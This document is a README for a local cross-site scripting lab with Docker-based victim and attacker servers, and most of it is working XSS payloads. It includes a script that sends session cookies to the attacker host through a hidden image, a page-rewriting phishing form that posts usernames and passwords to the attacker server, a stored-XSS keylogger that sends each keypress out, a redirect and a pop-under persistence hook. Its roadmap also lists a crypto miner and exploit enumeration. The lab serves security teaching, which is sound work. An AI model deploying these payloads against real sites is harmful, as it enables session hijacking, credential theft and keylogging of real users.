# Quick Start

`docker-compose` up in `docker` folder

## Entrypoints

- Victim: `http://localhost:3000`
- Attacker: See Docker Logs

# Payloads

## XSS Check

Simple check to verify XSS can manipulate sessions:

### Check for session fixation

Login with: `admin` `istrator`

enter

`<script>document.cookie='connect.sid=12345;path=/'</script>`

if you are logged out, XSS is possible.

## Session Hijacking / Get Cookies

### By Hidden Image

```
<script>img = document.createElement("img");img.src = "http://localhost/"+document.cookie;img.style.display = "none";x = document.getElementsByTagName("BODY")[0];x.appendChild(img);</script>
```
Goto other Browser:

e.g. Firefox:

- Web-Store
- Cookies
- Setup Path and value
- Call http://localhost:3000/sessionxss/protected

### Phishing

#### JavaScript DOM Manipulation and Redirect

Payload:

```
<script>
function removeTree(nodeIterator){
while (nodeIterator.firstChild) {nodeIterator.removeChild(nodeIterator.firstChild);}
}
removeTree(document.body);

var header = document.createElement("header");

var para1 = document.createElement("p");
para1.setAttribute("style","text-align:center;");

var img = document.createElement("img");
img.setAttribute("src","logo.png")
img.setAttribute("alt","Logo");

var form = document.createElement("form");
form.setAttribute("action","http://localhost/loginpage/login.php");
form.setAttribute("method","POST");
form.setAttribute("id","findme");

var para2 = document.createElement("p");
var para2text = document.createTextNode("Enter Login data");

var div1 = document.createElement("div");

var label1 = document.createElement("label");
label1.setAttribute("for","user");
var label1text = document.createTextNode("Username:");

var input1 = document.createElement("input");
input1.setAttribute("name","user");

var div2 = document.createElement("div");

var label2 = document.createElement("label");
label2.setAttribute("for","user");
var label2text = document.createTextNode("Password:");

var input2 = document.createElement("input");
input2.setAttribute("name","pass");
input2.setAttribute("type","password");

var br = document.createElement("br");

var button = document.createElement("button");var body = document.body;
button.setAttribute("type","submit");
var buttontext = document.createTextNode("Login");

body.appendChild(header);
header.appendChild(para1);
header.appendChild(img);
body.appendChild(form);
form.appendChild(para2);
para2.appendChild(para2text);
form.appendChild(div1);
div1.appendChild(label1);
label1.appendChild(label1text);
div1.appendChild(input1);
form.appendChild(br);
form.appendChild(div2);
div2.appendChild(label2);
label2.appendChild(label2text);
div2.appendChild(input2);
form.appendChild(br);
form.appendChild(button);
button.appendChild(buttontext);

window.onload = function () {
	var nodeIt = document.getElementById("findme");
	while (nodeIt.nextSibling){nodeIt = nodeIt.nextSibling;removeTree(nodeIt);
	}}
</script>
```

#### Redirect to Victim Server 

More obvious because of URL Change:

```
<script>
window.location.replace("http://localhost/loginpage/LoginPage.htm");
</script>
```

### Keylogger

#### Simple Keylogger / Stored XSS

Store in the list:
```
<script>
function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}
document.onkeypress = zx;
function zx(e){
	var charCode = (typeof e.which == "number") ? e.which : e.keyCode;
	httpGet("http://localhost/c?"+charCode);
}
</script>
```

If you now goto the list and enter keys they will be send to attackerserver.

### Make XSS persistent

#### Pop-Under

First of all we need to create a page where our javascript hook lives. Therefore we create a pop-under.
After we have this, we could use Cross-Messaging (see e.g. [1](https://javascript.info/cross-window-communication) or [2](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) to communicate with our xss-hooked application.

Following payload works as pop-under on the following browsers if you allow popups for the side:

- Google Chrome 65.0.3325.181
- Firefox 59.0.2
- Safari 11.0.3

```
<script>
var popunder;
var _parent;
function jsPopunder(sUrl) {

sName = "s";
var sOptions = 'toolbar=no,scrollbars=yes,location=yes,statusbar=yes,menubar=no,resizable=no,width=100,height=100,screenX=2048,screenY=2048,left=2048,top=2048';

// create pop-up from parent context
_parent = (top != self && typeof(top.document.location.toString())==='string') ? top : self;
_parent.name = "parent";
var popunder = _parent.window.open(sUrl, sName, sOptions);
if (popunder) {
popunder.blur();
if (navigator.userAgent.indexOf('MSIE') === -1) {
popunder.params = { url: sUrl };
(function(e) {
if (typeof window.mozPaintCount != 'undefined' || typeof navigator.webkitGetUserMedia === "function") {
try {
var poltergeist = document.createElement('a');
poltergeist.href = "javascript:window.open('about:blank').close();document.body.removeChild(poltergeist)";
document.body.appendChild(poltergeist).click();
}catch(err){}
}
})(popunder);
}
window.focus();
try{ opener.window.focus(); }catch(err){}
}
}
jsPopunder("http://localhost:8000/test.html");
setTimeout(function(){
	window.focus();
	if (_parent) {_parent.window.focus();} 
	goBack = window.open('','parent');
	if (goBack) {goBack.focus();}
}, 100);
</script>
```

# Configuration in more Detail

## Docker 

### Single Docker Builds

#### Victim Server

goto `docker/victimserver` folder

`docker build -t sessionvictimserver .`
`docker run -ti --rm -p 127.0.0.1:3000:3000 sessionvictimserver`

visit [http://localhost:3000/sessionxss/login](http://localhost:3000/sessionxss/login)

#### Attacker Server

- goto `docker/attackerserver` folder
- run `docker build -t xss_attack_server .`
- run `docker run --rm -ti -p 127.0.0.1:80:80 xss_attack_server .`

## Just Code 

### Attacker Server
goto `docker/attackerserver/serverfiles`

### Victim Server
goto `docker/victimserver/files`

### Execution

- run: `node index.js`
- goto: `http://localhost:3000/sessionxss/login`

# Todo / Roadmap

- [-] Miner https://github.com/cryptonoter/CryptoNoter
- [-] BeEF 
- [-] Add https://github.com/hadynz/xss-keylogger
- [-] Permanent CSRF Attacks against other Website through XSS
- [-] JavaScript Modification Framework, change XSSed site dynamically 
- [-] Enumerate Client Information
- [-] use Client Information to list exploits
- [-] Heap Exploits
- [-] Spectre